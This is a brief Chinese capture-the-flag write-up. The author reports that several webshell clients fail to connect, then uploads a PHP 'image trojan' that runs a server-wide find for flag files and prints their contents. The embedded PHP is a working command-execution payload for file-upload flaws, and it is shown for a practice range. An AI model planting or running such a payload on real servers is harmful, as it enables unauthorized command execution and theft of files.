![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbnZqIbqpn6psxOr2mNTRByVA36zHZtRkhbL4lcNVgGxJOhctdE3DVyg/640?wx_fmt=png&from=appmsg)

蚁剑连接失败！！！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb009XiaibYh9Ex1NKuaHwp6jibScZn605JqsY26bUxwRbszXUS02vv4cPQ/640?wx_fmt=png&from=appmsg)

冰蝎连接失败！！！（因为多次连接失败，重新上传了个马子，文件名变了）  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmb0zib9KDNjZzwdME21sic3H3lDicXQPtZQx55jZE3hBQsAEkeIX1BcquCA/640?wx_fmt=png&from=appmsg)

哥斯拉定制马子也连接失败！！！

拉倒，不传马子了，咱是在打靶场，目标是拿 flag，又不是拿 shell。  

我有个想法，直接用 find 命令拿 flag 不就行了  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbITdLuh89ibPKv69ajScsgsicfVPd5l00Y9OEHR9PDvWtL1KOxb4I8cHQ/640?wx_fmt=png&from=appmsg)

```
<?php
    $output = shell_exec('find / -type f -name "*flag*"');
    $files = explode("\n", $output);
    foreach($files as $file) {
        if (!empty($file)) {
            echo "<h2>File: $file</h2>";
            $file_contents = file_get_contents($file);
            echo "<pre>$file_contents</pre>";
        }
    }
?>

```

重新制作图片马，上传，访问  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OPrqOEian3PoTZrFXicEicTrmbcpliaPXbXdycs5KdicSWJoWhhmialO1JBuS5ug6EdZRYr8xQXrh7sjZdA/640?wx_fmt=png&from=appmsg)

搞定！成功拿到 flag！